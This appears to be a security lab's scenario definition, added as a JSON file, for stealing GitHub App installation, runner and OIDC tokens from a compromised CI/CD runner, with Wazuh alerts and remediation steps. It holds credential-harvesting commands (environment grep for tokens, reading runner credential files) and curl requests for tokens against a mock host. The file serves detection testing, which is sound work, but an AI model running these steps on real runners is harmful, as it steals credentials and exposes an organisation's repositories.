@@ -1,0 +1,193 @@
+{
+  "id": "S6-02",
+  "name": "GitHub App Installation Token Theft",
+  "category": "Infrastructure",
+  "version": "1.0",
+  "description": "Exploit a compromised CI/CD runner to steal GitHub App installation tokens with broad repository access. GitHub Apps can access all repos in an org when installed with repository_selection=all.",
+  "difficulty": "Medium",
+  "real_world_relevance": "CircleCI breach (2023) involved GitHub OAuth token theft. Codecov supply chain attack used compromised CI to steal Git credentials. GitHub App tokens grant programmatic repo access.",
+
+  "mitre_attack": {
+    "tactics": ["Credential Access", "Lateral Movement"],
+    "techniques": [
+      {"id": "T1528", "name": "Steal Application Access Token"},
+      {"id": "T1552.007", "name": "Unsecured Credentials: Container API"}
+    ]
+  },
+
+  "prerequisites": {
+    "containers": ["cicd-runner"],
+    "network": "cicd_net",
+    "services": ["mock-cicd:8080"],
+    "permissions": "CI/CD runner access with GitHub App context"
+  },
+
+  "attack_flow": {
+    "description": "Attacker pivots from compromised CI/CD runner to steal GitHub App installation tokens for broad repository access",
+    "diagram": [
+      "1. Attacker compromises CI/CD runner (e.g., via supply chain attack)",
+      "2. Attacker enumerates available GitHub tokens in environment",
+      "3. Attacker discovers GitHub App installation ID",
+      "4. Attacker requests installation access token from GitHub API",
+      "5. Token returned with repository_selection=all (overprivileged)",
+      "6. Attacker uses token to access all org repositories"
+    ]
+  },
+
+  "phases": [
+    {
+      "name": "Environment Enumeration",
+      "description": "Discover GitHub-related tokens and configuration in CI/CD environment",
+      "actions": [
+        {
+          "type": "command",
+          "command": "env | grep -iE 'GITHUB|GH_|ACTIONS' 2>/dev/null | head -10",
+          "expected_output_contains": ["GITHUB"],
+          "description": "List GitHub-related environment variables"
+        },
+        {
+          "type": "command",
+          "command": "cat /runner/.credentials 2>/dev/null || echo 'No runner credentials file'",
+          "description": "Check for runner credential files"
+        }
+      ]
+    },
+    {
+      "name": "GitHub API Reconnaissance",
+      "description": "Enumerate available GitHub API endpoints and repos",
+      "actions": [
+        {
+          "type": "http_request",
+          "method": "GET",
+          "target": "http://mock-cicd:8080/github/repos/demo-org/demo-repo/actions/secrets",
+          "expected_output_contains": ["AWS_ACCESS_KEY_ID", "DEPLOY_TOKEN"],
+          "expected_status": 200,
+          "description": "List secrets available to the workflow"
+        }
+      ]
+    },
+    {
+      "name": "GitHub App Token Theft",
+      "description": "Request an installation access token for the GitHub App",
+      "critical": true,
+      "actions": [
+        {
+          "type": "http_request",
+          "method": "POST",
+          "target": "http://mock-cicd:8080/github/app/installations/12345/access_tokens",
+          "expected_output_contains": ["ghs_", "repository_selection", "all"],
+          "expected_status": 200,
+          "description": "Obtain GitHub App installation token with broad access"
+        }
+      ]
+    },
+    {
+      "name": "Runner Token Theft",
+      "description": "Steal the GitHub Actions runner registration token",
+      "actions": [
+        {
+          "type": "http_request",
+          "method": "POST",
+          "target": "http://mock-cicd:8080/github/actions/runner/token",
+          "expected_output_contains": ["token"],
+          "expected_status": 200,
+          "description": "Request runner registration token for persistence"
+        }
+      ]
+    },
+    {
+      "name": "OIDC Token Theft",
+      "description": "Steal GitHub Actions OIDC token for cloud access",
+      "actions": [
+        {
+          "type": "http_request",
+          "method": "GET",
+          "target": "http://mock-cicd:8080/github/actions/oidc/token?audience=sts.amazonaws.com",
+          "expected_output_contains": ["eyJ"],
+          "expected_status": 200,
+          "description": "Request OIDC token for cloud provider access via workload identity"
+        }
+      ]
+    }
+  ],
+
+  "indicators_of_compromise": [
+    {
+      "type": "Process",
+      "description": "GitHub token enumeration in environment",
+      "wazuh_rule": "100800"
+    },
+    {
+      "type": "WebAccess",
+      "description": "GitHub App installation token request",
+      "wazuh_rule": "100901"
+    },
+    {
+      "type": "WebAccess",
+      "description": "OIDC token request for cloud access",
+      "wazuh_rule": "100907"
+    }
+  ],
+
+  "expected_wazuh_alerts": [
+    {
+      "rule_id": "100800",
+      "level": 10,
+      "description": "NHI: GitHub token detected in environment/process"
+    },
+    {
+      "rule_id": "100901",
+      "level": 12,
+      "description": "NHI: GitHub token pattern detected"
+    },
+    {
+      "rule_id": "100952",
+      "level": 14,
+      "description": "NHI: CI/CD token + git credential access - supply chain attack"
+    }
+  ],
+
+  "remediation": {
+    "immediate": [
+      "Revoke the compromised GitHub App installation token",
+      "Rotate all secrets accessible from the CI/CD pipeline",
+      "Review recent commits and PR merges for unauthorized changes"
+    ],
+    "long_term": [
+      "Limit GitHub App permissions to specific repositories (not all)",
+      "Use short-lived tokens with minimal scopes",
+      "Implement IP allowlisting for GitHub App API access",
+      "Enable GitHub audit log monitoring for token generation",
+      "Use ephemeral CI/CD runners that are destroyed after each job"
+    ]
+  },
+
+  "demo_script": {
+    "container": "cicd-runner",
+    "commands": [
+      "# Step 1: Enumerate GitHub environment",
+      "env | grep -i GITHUB 2>/dev/null || echo 'No GitHub env vars'",
+      "",
+      "# Step 2: Request GitHub App installation token",
+      "curl -s -X POST http://mock-cicd:8080/github/app/installations/12345/access_tokens 2>/dev/null | python3 -m json.tool || echo 'Mock CI/CD not reachable'",
+      "",
+      "# Step 3: Request OIDC token for cloud access",
+      "curl -s http://mock-cicd:8080/github/actions/oidc/token 2>/dev/null | python3 -m json.tool || echo 'OIDC endpoint not available'"
+    ]
+  },
+
+  "references": [
+    {
+      "title": "GitHub App Installation Access Tokens",
+      "url": "https://docs.github.com/en/apps/creating-github-apps/authenticating-with-a-github-app/generating-an-installation-access-token-for-a-github-app"
+    },
+    {
+      "title": "CircleCI Security Incident (2023)",
+      "url": "https://circleci.com/blog/jan-4-2023-incident-report/"
+    },
+    {
+      "title": "MITRE ATT&CK T1528 - Steal Application Access Token",
+      "url": "https://attack.mitre.org/techniques/T1528/"
+    }
+  ]
+}
